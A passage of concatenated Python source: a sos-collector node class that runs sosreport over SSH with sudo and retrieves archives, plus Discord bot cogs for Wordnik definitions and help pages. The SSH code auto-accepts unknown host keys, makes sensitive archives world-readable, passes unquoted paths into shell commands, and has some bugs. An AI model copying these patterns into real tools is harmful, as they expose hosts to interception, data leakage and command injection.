        '''Close all ssh sessions for nodes'''
        for client in self.client_list:
            self.log_debug('Closing SSH connection to %s' % client.address)
            client.close_ssh_session()

    def create_cluster_archive(self):
        '''Calls for creation of tar archive then cleans up the temporary
        files created by sos-collector'''
        self.log_info('Creating archive of sosreports...')
        self.create_sos_archive()
        if self.archive:
            self.logger.info('Archive created as %s' % self.archive)
            self.cleanup()
            self.console.info('\nThe following archive has been created. '
                              'Please provide it to your support team.')
            self.console.info('    %s' % self.archive)

    def create_sos_archive(self):
        '''Creates a tar archive containing all collected sosreports'''
        try:
            self.archive = self._get_archive_path()
            with tarfile.open(self.archive, "w:gz") as tar:
                for fname in os.listdir(self.config['tmp_dir']):
                    arcname = fname
                    if fname == self.logfile.name.split('/')[-1]:
                        arcname = 'sos-collector.log'
                    if fname == self.console_log_file.name.split('/')[-1]:
                        arcname = 'ui.log'
                    tar.add(os.path.join(self.config['tmp_dir'], fname),
                            arcname=self.arc_name + '/' + arcname)
                tar.close()
        except Exception as e:
            msg = 'Could not create archive: %s' % e
            self._exit(msg, 2)

    def cleanup(self):
        ''' Removes the tmp dir and all sosarchives therein.

            If tmp dir was supplied by user, only the sos archives within
            that dir are removed.
        '''
        if self.config['tmp_dir_created']:
            self.delete_tmp_dir()
        else:
            for f in os.listdir(self.config['tmp_dir']):
                if re.search('*sosreport-*tar*', f):
                    os.remove(os.path.join(self.config['tmp_dir'], f))

# Copyright Red Hat 2017, Jake Hunsaker <jhunsake@redhat.com>
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License along
# with this program; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

import fnmatch
import inspect
import logging
import os
import paramiko
import re
import shutil
import socket
import subprocess
import six
import time

from distutils.version import LooseVersion
from subprocess import Popen, PIPE


class SosNode():

    def __init__(self, address, config, force=False, load_facts=True):
        self.address = address.strip()
        self.local = False
        self.hostname = None
        self.config = config
        self.sos_path = None
        self.retrieved = False
        self.hash_retrieved = False
        self.sos_info = {
            'version': None,
            'enabled': [],
            'disabled': [],
            'options': [],
            'presets': []
        }
        filt = ['localhost', '127.0.0.1', self.config['hostname']]
        self.logger = logging.getLogger('sos_collector')
        self.console = logging.getLogger('sos_collector_console')
        if self.address not in filt or force:
            self.connected = self.open_ssh_session()
            self.sftp = self.client.open_sftp()
        else:
            self.connected = True
            self.local = True
        if self.connected and load_facts:
            self.host = self.determine_host()
            self._set_sos_prefix(self.host.set_sos_prefix())
            if not self.host:
                self.connected = False
                self.close_ssh_session()
                return None
            self.log_debug("Host facts found to be %s" %
                           self.host.report_facts())
            self.get_hostname()
            self._load_sos_info()

    def _fmt_msg(self, msg):
        return '{:<{}} : {}'.format(self._hostname, self.config['hostlen'] + 1,
                                    msg)

    def file_exists(self, fname):
        '''Checks for the presence of fname on the remote node'''
        if not self.local:
            try:
                self.sftp.stat(fname)
                return True
            except Exception as err:
                return False
        else:
            try:
                os.stat(fname)
                return True
            except Exception:
                return False

    @property
    def _hostname(self):
        return self.hostname if self.hostname else self.address

    def _sanitize_log_msg(self, msg):
        '''Attempts to obfuscate sensitive information in log messages such as
        passwords'''
        reg = r'(?P<var>(pass|key|secret|PASS|KEY|SECRET).*?=)(?P<value>.*?\s)'
        return re.sub(reg, r'\g<var>****** ', msg)

    def log_info(self, msg):
        '''Used to print and log info messages'''
        caller = inspect.stack()[1][3]
        lmsg = '[%s:%s] %s' % (self._hostname, caller, msg)
        self.logger.info(lmsg)
        self.console.info(self._fmt_msg(msg))

    def log_error(self, msg):
        '''Used to print and log error messages'''
        caller = inspect.stack()[1][3]
        lmsg = '[%s:%s] %s' % (self._hostname, caller, msg)
        self.logger.error(lmsg)
        self.console.error(self._fmt_msg(msg))

    def log_debug(self, msg):
        '''Used to print and log debug messages'''
        msg = self._sanitize_log_msg(msg)
        caller = inspect.stack()[1][3]
        msg = '[%s:%s] %s' % (self._hostname, caller, msg)
        self.logger.debug(msg)
        if self.config['verbose']:
            self.console.debug(msg)

    def get_hostname(self):
        '''Get the node's hostname'''
        sout = self.run_command('hostname')
        self.hostname = sout['stdout'].strip()
        self.log_debug(
            'Hostname set to %s' % self.hostname)

    def _format_cmd(self, cmd):
        '''If we need to provide a sudo or root password to a command, then
        here we prefix the command with the correct bits
        '''
        if self.config['become_root']:
            return "su -c '%s'" % cmd
        if self.config['need_sudo']:
            return "sudo -S %s" % cmd
        return cmd

    def _fmt_output(self, stdout=None, stderr=None, rc=0):
        '''Formats the returned output from a command into a dict'''
        if isinstance(stdout, (six.string_types, bytes)):
            stdout = [stdout.decode('utf-8')]
        if isinstance(stderr, (six.string_types, bytes)):
            stderr = [stderr.decode('utf-8')]
        if stdout:
            stdout = ''.join(s for s in stdout) or True
        if stderr:
            stderr = ' '.join(s for s in stderr) or False
        res = {'status': rc,
               'stdout': stdout,
               'stderr': stderr}
        return res

    def _load_sos_info(self):
        '''Queries the node for information about the installed version of sos
        '''
        cmd = self.host.prefix + self.host.pkg_query(self.host.sos_pkg_name)
        res = self.run_command(cmd)
        if res['status'] == 0:
            ver = res['stdout'].splitlines()[-1].split('-')[1]
            self.sos_info['version'] = ver
            self.log_debug('sos version is %s' % self.sos_info['version'])
        else:
            self.log_error('sos is not installed on this node')
            self.connected = False
            return False
        cmd = self.host.prefix + 'sosreport -l'
        sosinfo = self.run_command(cmd)
        if sosinfo['status'] == 0:
            self._load_sos_plugins(sosinfo['stdout'])
        if self.check_sos_version('3.6'):
            self._load_sos_presets()

    def _load_sos_presets(self):
        cmd = self.host.prefix + 'sosreport --list-presets'
        res = self.run_command(cmd)
        if res['status'] == 0:
            for line in res['stdout'].splitlines():
                if line.strip().startswith('name:'):
                    pname = line.split('name:')[1].strip()
                    self.sos_info['presets'].append(pname)

    def _load_sos_plugins(self, sosinfo):
        ENABLED = 'The following plugins are currently enabled:'
        DISABLED = 'The following plugins are currently disabled:'
        OPTIONS = 'The following plugin options are available:'
        PROFILES = 'Profiles:'

        enablereg = ENABLED + '(.*?)' + DISABLED
        disreg = DISABLED + '(.*?)' + OPTIONS
        optreg = OPTIONS + '(.*?)' + PROFILES
        proreg = PROFILES + '(.*?)' + '\n\n'

        self.sos_info['enabled'] = self._regex_sos_help(enablereg, sosinfo)
        self.sos_info['disabled'] = self._regex_sos_help(disreg, sosinfo)
        self.sos_info['options'] = self._regex_sos_help(optreg, sosinfo)
        self.sos_info['profiles'] = self._regex_sos_help(proreg, sosinfo, True)

    def _regex_sos_help(self, regex, sosinfo, is_list=False):
        res = []
        for result in re.findall(regex, sosinfo, re.S):
            for line in result.splitlines():
                if not is_list:
                    try:
                        res.append(line.split()[0])
                    except Exception:
                        pass
                else:
                    r = line.split(',')
                    res.extend(p.strip() for p in r if p.strip())
        return res

    def _set_sos_prefix(self, prefix):
        '''Applies any configuration settings to the sos prefix defined by a
        host type
        '''
        if self.host.containerized:
            prefix = prefix % {
                'image': self.config['image'] or self.host.container_image
            }
        self.host.prefix = prefix

    def read_file(self, to_read):
        '''Reads the specified file and returns the contents'''
        try:
            self.log_debug("Reading file %s" % to_read)
            if not self.local:
                remote = self.sftp.open(to_read)
                return remote.read()
            else:
                with open(to_read, 'r') as rfile:
                    return rfile.read()
        except Exception as err:
            if err.errno == 2:
                self.log_debug("File %s does not exist on node" % to_read)
            else:
                self.log_error("Error reading %s: %s" % (to_read, err))
            return ''

    def determine_host(self):
        '''Attempts to identify the host installation against supported
        distributions
        '''
        for host_type in self.config['host_types']:
            host = self.config['host_types'][host_type](self.address)
            rel_string = self.read_file(host.release_file).strip()
            # force to str. Older py versions will return a string, newer will
            # return bytes. Forcing to string eases host profile maintenance
            try:
                rel_string = rel_string.decode('utf-8')
            except AttributeError:
                pass
            if host._check_enabled(rel_string):
                self.log_debug("Host installation found to be %s" %
                               host.distribution)
                return host
        self.log_error('Unable to determine host installation. Ignoring node')
        raise Exception('Host did not match any supported distributions')

    def check_sos_version(self, ver):
        '''Checks to see if the sos installation on the node is AT LEAST the
        given ver. This means that if the installed version is greater than
        ver, this will still return True
        '''
        return LooseVersion(self.sos_info['version']) >= ver

    def is_installed(self, pkg):
        '''Checks if a given package is installed on the node'''
        cmd = self.host.pkg_query(pkg)
        res = self.run_command(cmd)
        if res['status'] == 0:
            return True
        return False

    def run_command(self, cmd, timeout=180, get_pty=False, need_root=False):
        '''Runs a given cmd, either via the SSH session or locally'''
        if cmd.startswith('sosreport'):
            cmd = cmd.replace('sosreport', self.host.sos_bin_path)
            need_root = True
        if need_root:
            get_pty = True
            cmd = self._format_cmd(cmd)
        self.log_debug('Running command %s' % cmd)
        if 'atomic' in cmd:
            get_pty = True
        if not self.local:
            now = time.time()
            sin, sout, serr = self.client.exec_command(cmd, timeout=timeout,
                                                       get_pty=get_pty)
            while time.time() < now + timeout:
                if not sout.channel.exit_status_ready():
                    time.sleep(0.1)
                    if self.config['become_root'] and need_root:
                        sin.write(self.config['root_password'] + '\n')
                        sin.flush()
                        need_root = False
                    if self.config['sudo_pw'] and need_root:
                        sin.write(self.config['sudo_pw'] + '\n')
                        sin.flush()
                        need_root = False
                if sout.channel.exit_status_ready():
                    rc = sout.channel.recv_exit_status()
                    return self._fmt_output(sout, serr, rc)
            else:
                raise socket.timeout
        else:
            proc = Popen(cmd, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
            if self.config['become_root'] and need_root:
                stdout, stderr = proc.communicate(
                    input=self.config['root_password'] + '\n'
                )
            elif self.config['need_sudo'] and need_root:
                stdout, stderr = proc.communicate(
                    input=self.config['sudo_pw'] + '\n'
                )
            else:
                stdout, stderr = proc.communicate()
            rc = proc.returncode
            return self._fmt_output(stdout=stdout, stderr=stderr, rc=rc)

    def sosreport(self):
        '''Run a sosreport on the node, then collect it'''
        self.finalize_sos_cmd()
        self.log_debug('Final sos command set to %s' % self.sos_cmd)
        try:
            path = self.execute_sos_command()
            if path:
                self.finalize_sos_path(path)
            else:
                self.log_error('Unable to determine path of sos archive')
            if self.sos_path:
                self.retrieved = self.retrieve_sosreport()
        except Exception:
            pass
        self.cleanup()

    def _determine_ssh_error(self, errors):
        '''Used to handle ssh exceptions when trying to connect the node.

            errors: the 'errors' dict from the exception raised

            returns: either a formatted error string or None
        '''
        for err in errors:
            errno = errors[err].errno
            if errno == 103:
                return 'Key exchange failed'
            if errno == 108:
                return 'SSH version is unsupported'
            if errno == 111:
                return ("Could not open SSH session on port %s" %
                        self.config['ssh_port'])
            if errno == 115:
                return "No valid SSH user '%s'" % self.config['ssh_user']
        return None

    def open_ssh_session(self):
        '''Create the persistent ssh session we use on the node'''
        try:
            self.client = paramiko.SSHClient()
            self.client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            self.client.load_system_host_keys()
            self.log_debug('Opening session to %s.' % self.address)
            self.client.connect(self.address,
                                username=self.config['ssh_user'],
                                port=self.config['ssh_port'],
                                password=self.config['password'] or None,
                                timeout=15)
            self.log_debug('%s successfully connected' % self._hostname)
            return True
        except paramiko.AuthenticationException:
            if not self.config['password']:
                self.log_error('Authentication failed. SSH keys installed?')
            else:
                self.log_error('Authentication failed. Incorrect password.')
        except paramiko.BadAuthenticationType:
            self.log_error('Bad authentication type. The node rejected the '
                           'authentication attempt.')
        except paramiko.BadHostKeyException:
            self.log_error('Provided key was rejected by remote SSH client.'
                           ' Check ~/.ssh/known_hosts.')
        except socket.gaierror as err:
            if err.errno == -2:
                self.log_error('Provided hostname did not resolve.')
            else:
                self.log_error('Socket error trying to connect: %s' % err)
        except Exception as err:
            msg = "Unable to connect: %s" % err
            if hasattr(err, 'errors'):
                msg = self._determine_ssh_error(err.errors)
            self.log_error(msg)
        raise

    def close_ssh_session(self):
        '''Handle closing the SSH session'''
        if self.local:
            return True
        try:
            self.client.close()
            self.connected = False
            return True
        except Exception as e:
            self.log_error('Error closing SSH session: %s' % e)
            return False

    def _preset_exists(self, preset):
        '''Verifies if the given preset exists on the node'''
        return preset in self.sos_info['presets']

    def _plugin_exists(self, plugin):
        '''Verifies if the given plugin exists on the node'''
        return any(plugin in s for s in [self.sos_info['enabled'],
                                         self.sos_info['disabled']])

    def _check_enabled(self, plugin):
        '''Checks to see if the plugin is default enabled on node'''
        return plugin in self.sos_info['enabled']

    def _check_disabled(self, plugin):
        '''Checks to see if the plugin is default disabled on node'''
        return plugin in self.sos_info['disabled']

    def _plugin_option_exists(self, opt):
        '''Attempts to verify that the given option is available on the node.
        Note that we only get available options for enabled plugins, so if a
        plugin has been force-enabled we cannot validate if the plugin option
        is correct or not'''
        plug = opt.split('.')[0]
        if not self._plugin_exists(plug):
            return False
        if (self._check_disabled(plug) and
                plug not in self.config['enable_plugins']):
            return False
        if self._check_enabled(plug):
            return opt in self.sos_info['options']
        # plugin exists, but is normally disabled. Assume user knows option is
        # valid when enabling the plugin
        return True

    def _fmt_sos_opt_list(self, opts):
        '''Returns a comma delimited list for sos plugins that are confirmed
        to exist on the node'''
        return ','.join(o for o in opts if self._plugin_exists(o))

    def finalize_sos_cmd(self):
        '''Use host facts and compare to the cluster type to modify the sos
        command if needed'''
        self.sos_cmd = self.config['sos_cmd']
        self.sos_cmd = self.host.prefix + self.sos_cmd

        label = self.determine_sos_label()
        if label:
            self.sos_cmd = ' %s %s' % (self.sos_cmd, label)                    

        if self.config['sos_opt_line']:
            return True

        if self.config['only_plugins']:
            plugs = [o for o in self.config['only_plugins']
                     if self._plugin_exists(o)]
            if len(plugs) != len(self.config['only_plugins']):
                not_only = list(set(self.config['only_plugins']) - set(plugs))
                self.log_debug('Requested plugins %s were requested to be '
                               'enabled but do not exist' % not_only)
            only = self._fmt_sos_opt_list(self.config['only_plugins'])
            if only:
                self.sos_cmd += ' --only-plugins=%s' % only                    
            return True

        if self.config['skip_plugins']:
            # only run skip-plugins for plugins that are enabled
            skip = [o for o in self.config['skip_plugins']
                    if self._check_enabled(o)]
            if len(skip) != len(self.config['skip_plugins']):
                not_skip = list(set(self.config['skip_plugins']) - set(skip))
                self.log_debug('Requested to skip plugins %s, but plugins are '
                               'already not enabled' % not_skip)
            skipln = self._fmt_sos_opt_list(skip)
            if skipln:
                self.sos_cmd += ' --skip-plugins=%s' % skipln                    

        if self.config['enable_plugins']:
            # only run enable for plugins that are disabled
            opts = [o for o in self.config['enable_plugins']
                    if o not in self.config['skip_plugins']
                    and self._check_disabled(o) and self._plugin_exists(o)]
            if len(opts) != len(self.config['enable_plugins']):
                not_on = list(set(self.config['enable_plugins']) - set(opts))
                self.log_debug('Requested to enable plugins %s, but plugins '
                               'are already enabled or do not exist' % not_on)
            enable = self._fmt_sos_opt_list(opts)
            if enable:
                self.sos_cmd += ' --enable-plugins=%s' % enable                    

        if self.config['plugin_options']:
            opts = [o for o in self.config['plugin_options']
                    if self._plugin_exists(o.split('.')[0])
                    and self._plugin_option_exists(o.split('=')[0])]
            if opts:
                self.sos_cmd += ' -k %s' % ','.join(o for o in opts)                    

        if self.config['preset']:
            if self._preset_exists(self.config['preset']):
                self.sos_cmd += ' --preset=%s' % self.config['preset']                    
            else:
                self.log_debug('Requested to enable preset %s but preset does '
                               'not exist on node' % self.config['preset'])

    def determine_sos_label(self):
        '''Determine what, if any, label should be added to the sosreport'''
        label = ''
        label += self.config['cluster'].get_node_label(self)

        if self.config['label']:
            label += ('%s' % self.config['label'] if not label
                      else '-%s' % self.config['label'])

        if not label:
            return None

        self.log_debug('Label for sosreport set to %s' % label)
        if self.check_sos_version('3.6'):
            lcmd = '--label'
        else:
            lcmd = '--name'
            label = '%s-%s' % (self.address.split('.')[0], label)
        return '%s=%s' % (lcmd, label)

    def finalize_sos_path(self, path):
        '''Use host facts to determine if we need to change the sos path
        we are retrieving from'''
        pstrip = self.host.sos_path_strip
        if pstrip:
            path = path.replace(pstrip, '')
        path = path.split()[0]
        self.log_debug('Final sos path: %s' % path)
        self.sos_path = path
        self.archive = path.split('/')[-1]

    def determine_sos_error(self, rc, stdout):
        if rc == -1:
            return 'sosreport process received SIGKILL on node'
        if rc == 1:
            if 'sudo' in stdout:
                return 'sudo attempt failed'
        if rc == 127:
            return 'sosreport terminated unexpectedly. Check disk space'
        if len(stdout) > 0:
            return stdout.split('\n')[0:1]
        else:
            return 'sos exited with code %s' % rc

    def execute_sos_command(self):
        '''Run sosreport and capture the resulting file path'''
        self.log_info("Generating sosreport...")
        try:
            path = False
            res = self.run_command(self.sos_cmd,
                                   timeout=self.config['timeout'],
                                   get_pty=True, need_root=True)
            if res['status'] == 0:
                for line in res['stdout'].splitlines():
                    if fnmatch.fnmatch(line, '*sosreport-*tar*'):
                        path = line.strip()
            else:
                err = self.determine_sos_error(res['status'], res['stdout'])
                self.log_debug("Error running sosreport. rc = %s msg = %s"
                               % (res['status'], res['stdout'] or
                                  res['stderr']))
                raise Exception(err)
            return path
        except socket.timeout:
            self.log_error('Timeout exceeded')
            raise
        except Exception as e:
            self.log_error('Error running sosreport: %s' % e)
            raise

    def retrieve_file(self, path):
        '''Copies the specified file from the host to our temp dir'''
        destdir = self.config['tmp_dir'] + '/'
        dest = destdir + path.split('/')[-1]
        try:
            if not self.local:
                if self.file_exists(path):
                    self.log_debug("Copying remote %s to local %s" %
                                   (path, destdir))
                    self.sftp.get(path, dest)
                else:
                    self.log_debug("Attempting to copy remote file %s, but it "
                                   "does not exist on filesystem" % path)
                    return False
            else:
                self.log_debug("Moving %s to %s" % (path, destdir))
                shutil.copy(path, dest)
            return True
        except Exception as err:
            self.log_debug("Failed to retrieve %s: %s" % (path, err))
            return False

    def remove_file(self, path):
        '''Removes the spciefied file from the host. This should only be used
        after we have retrieved the file already
        '''
        try:
            if self.file_exists(path):
                self.log_debug("Removing file %s" % path)
                if (self.local or self.config['become_root'] or
                        self.config['need_sudo']):
                    cmd = "rm -f %s" % path
                    res = self.run_command(cmd, need_root=True)
                else:
                    self.sftp.remove(path)
                return True
            else:
                self.log_debug("Attempting to remove remote file %s, but it "
                               "does not exist on filesystem" % path)
                return False
        except Exception as e:
            self.log_debug('Failed to remove %s: %s' % (path, e))
            return False

    def retrieve_sosreport(self):
        '''Collect the sosreport archive from the node'''
        if self.sos_path:
            if self.config['need_sudo'] or self.config['become_root']:
                try:
                    self.make_archive_readable(self.sos_path)
                except Exception:
                    self.log_error('Failed to make archive readable')
                    return False
                try:
                    self.make_archive_readable(self.sos_path + '.md5')
                except Exception:
                    self.log_debug('Failed to make md5 readable')
            self.logger.info('Retrieving sosreport from %s' % self.address)
            self.log_info('Retrieving sosreport...')
            ret = self.retrieve_file(self.sos_path)
            if ret:
                self.log_info('Successfully collected sosreport')
            else:
                self.log_error('Failed to retrieve sosreport')
                return False
            self.hash_retrieved = self.retrieve_file(self.sos_path + '.md5')
            return True
        else:
            # sos sometimes fails but still returns a 0 exit code
            if self.stderr.read():
                e = self.stderr.read()
            else:
                e = [x.strip() for x in self.stdout.readlines() if x.strip][-1]
            self.logger.error(
                'Failed to run sosreport on %s: %s' % (self.address, e))
            self.log_error('Failed to run sosreport. %s' % e)
            return False

    def remove_sos_archive(self):
        '''Remove the sosreport archive from the node, since we have
        collected it and it would be wasted space otherwise'''
        if self.sos_path is None:
            return
        if 'sosreport' not in self.sos_path:
            self.log_debug("Node sosreport path %s looks incorrect. Not "
                           "attempting to remove path" % self.sos_path)
            return
        removed = self.remove_file(self.sos_path)
        if not removed:
            self.log_error('Failed to remove sosreport')

    def cleanup(self):
        '''Remove the sos archive from the node once we have it locally'''
        self.remove_sos_archive()
        if self.hash_retrieved:
            self.remove_file(self.sos_path + '.md5')
        cleanup = self.host.set_cleanup_cmd()
        if cleanup:
            self.run_command(cleanup)

    def collect_extra_cmd(self, filenames):
        '''Collect the file created by a cluster outside of sos'''
        for filename in filenames:
            try:
                if self.config['need_sudo'] or self.config['become_root']:
                    try:
                        self.make_archive_readable(filename)
                    except Exception as err:
                        self.log_error("Unable to retrieve file %s" % filename)
                        self.log_debug("Failed to make file %s readable: %s"
                                       % (filename, err))
                        continue
                ret = self.retrieve_file(filename)
                if ret:
                    self.remove_file(filename)
                else:
                    self.log_error("Unable to retrieve file %s" % filename)
            except Exception as e:
                msg = 'Error collecting additional data from master: %s' % e
                self.log_error(msg)

    def make_archive_readable(self, filepath):
        '''Used to make the given archive world-readable, which is slightly
        better than changing the ownership outright.

        This is only used when we're not connecting as root.
        '''
        cmd = 'chmod o+r %s' % filepath
        res = self.run_command(cmd, timeout=10, need_root=True)
        if res['status'] == 0:
            return True
        else:
            msg = "Exception while making %s readable. Return code was %s"
            self.log_error(msg % (filepath, res['status']))
            raise Exception

"""
Utilises the free wordnik API.

Requires an API key.

Sign up:
    http://www.wordnik.com/signup

Get a key:
    http://developer.wordnik.com/

They seem to say they will send an email, however, I never got one. I checked
in my settings and found the API key there.

The key should be stored in the tokens.json file under "wordnik"
"""
import typing

# Pls fix your file names >.>
import wordnik.swagger as swagger
# noinspection PyPep8Naming
import wordnik.WordApi as wordapi
# noinspection PyPep8Naming
import wordnik.models.Definition as definition

import neko


_api_endpoint = 'http://api.wordnik.com/v4'
_dictionaries = 'all'


class WordnikCog(neko.Cog):
    def __init__(self):
        self.__token = neko.get_token('wordnik')
        self.logger.info(f'Opening API client for Wordnik to {_api_endpoint}')
        self.client = swagger.ApiClient(self.__token, _api_endpoint)

    @neko.command(
        name='def',
        aliases=['define', 'def', 'dfn'],                    
        brief='Looks for word definitions.',
        usage='name or phrase')
    async def get_word(self, ctx, *, word: str):
        """
        Gets a definition of a given word or phrase from WordNik
        """
        def _define():
            # Much complex. Very definition. Such API! Wow!
            api = wordapi.WordApi(self.client)

            # *prays to god this isn't lazy iterative.
            return api.getDefinitions(
                word,
                sourceDictionaries=_dictionaries,
                includeRelated=True
            )

        words: typing.List[definition.Definition] = await neko.no_block(_define)

        # Attempt to favour gcide and wordnet, as they have better definitions
        # imho.
        if words is None:
            await ctx.send('I couldn\'t find a definition for that.')
        else:

            front = []
            back = []

            for word in words:
                if word.sourceDictionary in ('gcide', 'wordnet'):
                    front.append(word)
                else:
                    back.append(word)

            # Re-join.
            words = [*front, *back]

            words: typing.List[definition.Definition] = [
                word for word in words
                if not word.sourceDictionary.startswith('ahd')
            ]

            # Max results to get is 100.
            max_count = min(100, len(words))

            book = neko.Book(ctx)

            for i in range(0, max_count):
                word = words[i]

                text = ''
                if word.partOfSpeech:
                    text += f'**{word.partOfSpeech}** '

                if word.text:
                    text += word.text

                if word.extendedText:
                    text += '\n\n'
                    text += word.extendedText

                page = neko.Page(

                    title=neko.capitalize(word.word),
                    description=neko.ellipses(text, 2000),
                    color=neko.random_colour()
                )

                if word.exampleUses:
                    example = word.exampleUses[0]
                    ex_text = neko.ellipses(example.text, 800)

                    page.add_field(
                        name='Example',
                        value=ex_text,
                        inline=False
                    )

                if word.relatedWords:

                    related = ', '.join([
                        ', '.join(rw.words) for rw in word.relatedWords
                    ])

                    page.add_field(
                        name='Synonyms',
                        value=neko.ellipses(related, 1000)
                    )

                if word.textProns:
                    pron = '\n'.join([tp.raw for tp in word.textProns])
                    pron = neko.ellipses(pron, 400)

                    page.add_field(
                        name='Pronunciations',
                        value=pron,
                    )

                if word.score:
                    page.add_field(
                        name='Scrabble score',
                        value=word.score.value
                    )

                if word.labels:
                    labels = ', '.join(label.text for label in word.labels)
                    labels = neko.ellipses(labels, 300)

                    page.add_field(
                        name='Labels',
                        value=labels
                    )

                if word.notes:
                    notes = []
                    for j, note in enumerate(word.notes):
                        notes.append(f'[{j+1}] {note.value}')

                    notes = neko.ellipses('\n\n'.join(notes), 300)

                    page.add_field(
                        name='Notes',
                        value=notes
                    )

                if word.attributionText:
                    attr = word.attributionText
                else:
                    attr = ('Extracted from '
                            f'{neko.capitalise(word.sourceDictionary)}')

                page.set_footer(text=attr)

                book += page

            await book.send()



"""
Implementation of a help command.
"""
import asyncio
import inspect
import random

import discord

import neko

__all__ = ['HelpCog', 'ActivityChangerCog', 'setup']

# Dodger blue.
default_color = 0x1E90FF


class HelpCog(neko.Cog):
    """Provides the inner methods with access to bot directly."""

    permissions = (neko.Permissions.SEND_MESSAGES |
                   neko.Permissions.ADD_REACTIONS |
                   neko.Permissions.READ_MESSAGES |
                   neko.Permissions.MANAGE_MESSAGES)

    def __init__(self, bot: neko.NekoBot):
        """
        Initialises the cog.
        :param bot: the bot.
        """
        self.bot = bot

    @neko.command(
        name='rtfm',
        brief='Shows help for the available bot commands.',
        aliases=['man', 'help'],
        usage='|command|group command')
    async def help_command(self, ctx: neko.Context, *, query=None):
        """
        Shows a set of help pages outlining the available commands, and
        details on how to operate each of them.

        If a command name is passed as a parameter (`help command`) then the
        parameter is searched for as a command name and that page is opened.
        """
        # TODO: maybe try to cache this! It's a fair amount of work each time.

        # Generates the book
        bk = neko.Book(ctx)

        # Maps commands to pages, so we can just jump to the page
        command_to_page = {}

        bk += await self.gen_front_page(ctx)
        command_to_page[None] = 0

        # Walk commands
        cmds = sorted(set(self.bot.walk_commands()),
                      key=lambda c: c.qualified_name)

        # We offset each index in the enumeration by this to get the
        # correct page number.
        offset = len(bk)

        for i, cmd in enumerate(cmds):
            bk += await self.gen_spec_page(ctx, cmd)
            # We add 1, as w
            command_to_page[cmd.qualified_name] = i + offset                    

        # Set the page
        try:
            page_index = command_to_page[query]                    
        except KeyError:                    
            await ctx.send(f'I could not find a command called {query}!')
        else:
            bk.index = page_index
            await bk.send()

    async def gen_front_page(self, ctx: neko.Context) -> neko.Page:
        """
        Generates an about page. This is the first page of the help
        pagination.

        :param ctx: the command context.
        """

        desc = f'{neko.__copyright__} under the {neko.__license__} license.\n\n'

        # Gets the docstring for the root module if there is one.
        doc_str = inspect.getdoc(neko)
        doc_str = inspect.cleandoc(doc_str if doc_str else '')
        desc += neko.remove_single_lines(doc_str)

        page = neko.Page(
            title=f'{neko.__title__} v{neko.__version__}',
            description=desc,
            color=default_color,
            url=neko.__repository__
        )

        page.set_thumbnail(url=self.bot.user.avatar_url)

        page.add_field(
            name='Repository',
            value=neko.__repository__
        )

        # If we are the bot owner, we do not hide any commands.
        is_bot_owner = await self.bot.is_owner(ctx.author)

        cmds = sorted(self.bot.commands, key=lambda c: c.name)
        cmds = [self.format_command_name(cmd)
                for cmd in cmds
                if is_bot_owner or not cmd.hidden]

        page.add_field(
            name='Available commands',
            value=', '.join(cmds),
            inline=False
        )

        return page

    # noinspection PyUnusedLocal
    async def gen_spec_page(self,
                            ctx: neko.Context,
                            cmd: neko.NekoCommand) -> neko.Page:
        """
        Given a context and a command, generate a help page entry for the
        command.

        :param ctx: the context to use to determine if we can run the command
                here.
        :param cmd: the command to generate the help page for.
        :return: a book page.
        """
        pfx = self.bot.command_prefix
        fqn = cmd.qualified_name
        brief = f'**{fqn}**\n{cmd.brief if cmd.brief else ""}'
        doc_str = neko.remove_single_lines(cmd.help)
        usages = cmd.usage.split('|') if cmd.usage else ''
        usages = map(lambda u: f'• {pfx}{fqn} {u}', usages)
        usages = '\n'.join(sorted(usages))
        aliases = sorted(cmd.aliases)

        if cmd.parent:
            super_command = self.format_command_name(cmd.parent)
        else:
            super_command = None

        # noinspection PyUnresolvedReferences
        can_run = await cmd.can_run(ctx)

        if isinstance(cmd, neko.GroupMixin):
            def sub_cmd_map(c):
                c = self.format_command_name(c)
                c = f'• {c}'
                return c

            # Cast to a set to prevent duplicates for aliases. Hoping this
            # fixes #9 again.
            # noinspection PyUnresolvedReferences
            sub_commands = map(sub_cmd_map, set(cmd.walk_commands()))
            sub_commands = sorted(sub_commands)
        else:
            sub_commands = []

        if getattr(cmd, 'enabled', False) and can_run:
            color = default_color
        elif not can_run:
            color = 0
        else:
            color = 0xFF0000

        page = neko.Page(
            title=f'Command documentation',
            description=brief,
            color=color
        )

        if doc_str:
            page.add_field(
                name='Description',
                value=doc_str,
                inline=False
            )

        if usages:
            page.add_field(
                name='Usage',
                value=usages,
                inline=False
            )

        if aliases:
            page.add_field(
                name='Aliases',
                value=', '.join(aliases)
            )

        if sub_commands:
            page.add_field(
                name='Child commands',
                value='\n'.join(sub_commands)
            )

        if super_command:
            page.add_field(
                name='Parent command',
                value=super_command
            )

        if not can_run and cmd.enabled:
            page.set_footer(
                text='You do not hve permission to run the command here.'
            )
        elif not cmd.enabled:
            page.set_footer(
                text='This command has been disabled globally.'
            )

        return page

    @staticmethod
    def format_command_name(cmd: neko.NekoCommand,
                            *,
                            is_full=False) -> str:
        """
        Formats the given command using it's name, in markdown.

        If the command is disabled, it is crossed out.
        If the command is a group, it is proceeded with an asterisk.
            This is only done if the command has at least one sub-command
            present.
        If the command is hidden, it is displayed in italics.

        :param cmd: the command to format.
        :param is_full: defaults to false. If true, the parent command is
                    prepended to the returned string first.
        """
        name = cmd.name

        if not cmd.enabled:
            name = f'~~{name}~~'

        if cmd.hidden:
            name = f'*{name}*'

        if isinstance(cmd, neko.GroupMixin) and getattr(cmd, 'commands'):
            name = f'{name}\*'

        if is_full:
            name = f'{cmd.full_parent_name} {name}'.strip()

        return name


class ActivityChangerCog(neko.Cog):
    """
    Handles updating the game every-so-often to a new message.
    """
    def __init__(self, bot: neko.NekoBot):
        self.bot = bot

        # Use a lock to determine if the coroutine is running or not.
        # This is used to restart the game-displaying loop on_ready if and
        # only if the coroutine is not already running.
        self.running_lock = asyncio.Lock()

    def next_activity(self):
        """Acts as an iterator for getting the next activity-change coro."""
        # Get a random command, this is more fun.
        command_choice = list(
            filter(
                # Hide superuser commands.
